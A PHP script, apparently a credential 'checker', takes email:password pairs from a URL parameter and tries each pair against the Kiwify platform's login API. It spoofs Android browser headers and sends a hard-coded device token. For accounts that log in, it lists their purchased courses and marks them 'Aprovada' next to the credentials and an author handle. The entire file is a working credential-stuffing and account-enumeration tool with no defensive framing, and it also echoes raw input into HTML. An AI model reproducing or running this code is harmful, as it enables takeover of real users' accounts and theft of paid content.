<?php

$lista = isset($_GET['lista']) ? $_GET['lista'] : null;

if (!$lista) {
    die('Parâmetro lista não fornecido. Use o formato ?lista=email:senha');
}

list($login, $senha) = explode(':', $lista);
$statusLogin = "Reprovada";
$cursos = [];
$start_time = microtime(true);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://admin-api.kiwify.com.br/v1/handleAuth/login');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: admin-api.kiwify.com.br',
    'accept: application/json, text/plain, */*',
    'accept-language: pt-BR,pt;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type: application/json;charset=UTF-8',
    'origin: https://dashboard.kiwify.com.br',
    'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'email' => $login,
    'password' => $senha,
    'returnSecureToken' => true
]));
$response = curl_exec($ch);
$data = json_decode($response, true);
$idToken = $data['idToken'] ?? null;

if ($idToken) {
    $statusLogin = "Aprovada";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://admin-api.kiwify.com.br/v1/viewer/schools/courses?&page=1&archived=false');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'authority: admin-api.kiwify.com.br',
        'accept: application/json, text/plain, */*',
        'accept-language: pt-BR,pt;q=0.9,ru-RU;q=0.8,ru;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization: Bearer ' . $idToken, 
        'kiwi-device-token: puIJnmDVFq3cUcioBXZIA7NgzvpkzffjnnUpSfMvYwpyUslmdQtOwKyck4RyCLtmEnIBQR0pimr4b7vPwqri5RfuPV5hPwifA93K',
        'origin: https://dashboard.kiwify.com.br',
        'sec-ch-ua: "Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile: ?1',
        'sec-ch-ua-platform: "Android"',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-site',
        'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'accept-encoding: gzip',
    ]);
    curl_setopt($ch, CURLOPT_ENCODING, '');
    $cursosResponse = curl_exec($ch);
    $cursos = json_decode($cursosResponse, true);
}

$end_time = microtime(true);
$elapsed_time = number_format(($end_time - $start_time), 2);

if ($statusLogin === "Aprovada") {
    $error_message = "Cursos disponíveis: ";
    
    if (!empty($cursos) && isset($cursos['courses'])) {
        foreach ($cursos['courses'] as $curso) {
            $error_message .= "{$curso['course_info']['name']}, ";
        }
    } else {
        $error_message .= "Nenhum curso encontrado.";
    }
     $error_message = rtrim($error_message, ', ');
     
    echo "<span style='color: green;'>Aprovada » $lista » $error_message » {$elapsed_time} segundos » @NocyamIsLonely</span><br>";
} else {
    echo "<span style='color: red;'>Reprovada » $lista » {$elapsed_time} segundos » @NocyamIsLonely</span><br>";
}

?>
